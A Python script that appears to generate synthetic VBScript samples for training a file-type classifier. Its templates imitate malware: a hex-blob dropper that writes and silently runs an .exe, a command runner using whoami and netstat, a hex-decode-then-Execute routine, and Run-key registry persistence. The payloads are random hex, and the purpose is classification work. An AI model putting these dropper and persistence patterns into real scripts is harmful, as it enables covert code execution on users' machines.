#!/usr/bin/env python3
"""Generate 6 VBScript samples wrapped in a bare `<script language="VBScript">`
fragment (no surrounding HTML). Teaches VBScript centroid that the wrapper
tokens can belong to it, without poaching HTA (which needs full HTML page).
"""
import os
import random
import string

ROOT = "/Users/dazhi/projects/filetyping/whatis/samples/VBScript"


def upper_word(n=10):
    return "".join(random.choices(string.ascii_letters, k=n))


def hex_blob(n):
    return "".join(random.choices(string.hexdigits.lower()[:16], k=n))


def gen_wrapped(seed):
    random.seed(seed)
    lang_case = random.choice(['VBScript', 'vbscript', 'VBSCRIPT', 'VbScript'])
    fn_name = upper_word(random.randint(6, 12))
    var_obj = "var_" + upper_word(random.randint(4, 8))
    var_path = "var_" + upper_word(random.randint(4, 8))
    var_shell = "var_" + upper_word(random.randint(4, 8))
    var_stream = "var_" + upper_word(random.randint(4, 8))
    var_sc = "var_" + upper_word(random.randint(4, 8))
    shellcode_size = random.randint(2000, 8000)
    shellcode = hex_blob(shellcode_size)

    body_variants = [
        # Variant A: shellcode dropper
        f"""<script language="{lang_case}">
\tFunction {fn_name}()
\t\t{var_sc} = "{shellcode}"
\t\tDim {var_obj}
\t\tSet {var_obj} = CreateObject("Scripting.FileSystemObject")
\t\tDim {var_path}
\t\t{var_path} = {var_obj}.GetSpecialFolder(2) & "\\\\" & "{upper_word(8)}.exe"
\t\tDim {var_stream}
\t\tSet {var_stream} = CreateObject("ADODB.Stream")
\t\t{var_stream}.Type = 1
\t\t{var_stream}.Open
\t\tDim i
\t\tFor i = 1 To Len({var_sc}) Step 2
\t\t\t{var_stream}.Write Chr(CInt("&H" & Mid({var_sc}, i, 2)))
\t\tNext
\t\t{var_stream}.SaveToFile {var_path}, 2
\t\t{var_stream}.Close
\t\tDim {var_shell}
\t\tSet {var_shell} = CreateObject("WScript.Shell")
\t\t{var_shell}.Run {var_path}, 0, True
\tEnd Function
\tCall {fn_name}()
</script>
""",
        # Variant B: shell command runner
        f"""<script language="{lang_case}">
\tDim {var_shell}
\tSet {var_shell} = CreateObject("WScript.Shell")
\tDim {var_obj}
\tSet {var_obj} = CreateObject("Scripting.FileSystemObject")
\tIf {var_obj}.FileExists("C:\\\\Windows\\\\System32\\\\cmd.exe") Then
\t\t{var_shell}.Run "cmd /c {random.choice(['ipconfig', 'whoami', 'tasklist', 'netstat -an'])} > %TEMP%\\\\{upper_word(6)}.txt", 0, True
\t\tDim {var_stream}
\t\tSet {var_stream} = {var_obj}.OpenTextFile({var_shell}.ExpandEnvironmentStrings("%TEMP%\\\\out.txt"), 1)
\t\tDim {var_path}
\t\tDo While Not {var_stream}.AtEndOfStream
\t\t\t{var_path} = {var_stream}.ReadLine
\t\t\t' inspect line
\t\tLoop
\t\t{var_stream}.Close
\tEnd If
\tSet {var_obj} = Nothing
\tSet {var_shell} = Nothing
</script>
""",
        # Variant C: Function-based with hex blob and Chr decoding
        f"""<script language="{lang_case}">
\tFunction Decode(s)
\t\tDim r, j
\t\tr = ""
\t\tFor j = 1 To Len(s) Step 2
\t\t\tr = r & Chr(CInt("&H" & Mid(s, j, 2)))
\t\tNext
\t\tDecode = r
\tEnd Function
\tDim {var_sc}
\t{var_sc} = "{shellcode[:1000]}"
\tDim {var_path}
\t{var_path} = Decode({var_sc})
\tExecute {var_path}
</script>
""",
        # Variant D: registry / persistence
        f"""<script language="{lang_case}">
\tDim {var_shell}, {var_path}
\tSet {var_shell} = CreateObject("WScript.Shell")
\t{var_path} = "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\{upper_word(8)}"
\t{var_shell}.RegWrite {var_path}, "wscript.exe " & WScript.ScriptFullName, "REG_SZ"
\tWScript.Echo "Persistence installed at " & {var_path}
\tDim {var_obj}
\tSet {var_obj} = CreateObject("Scripting.FileSystemObject")
\tIf Not {var_obj}.FolderExists("%APPDATA%\\\\{upper_word(6)}") Then
\t\t{var_obj}.CreateFolder({var_shell}.ExpandEnvironmentStrings("%APPDATA%\\\\{upper_word(6)}"))
\tEnd If
</script>
""",
    ]
    return random.choice(body_variants)


def main():
    for i in range(6):
        path = os.path.join(ROOT, f"vbs_wrapped_{i}.vbs")
        with open(path, "w") as f:
            f.write(gen_wrapped(seed=11000 + i))
        print(f"wrote {path} ({os.path.getsize(path)} bytes)")


if __name__ == "__main__":
    main()
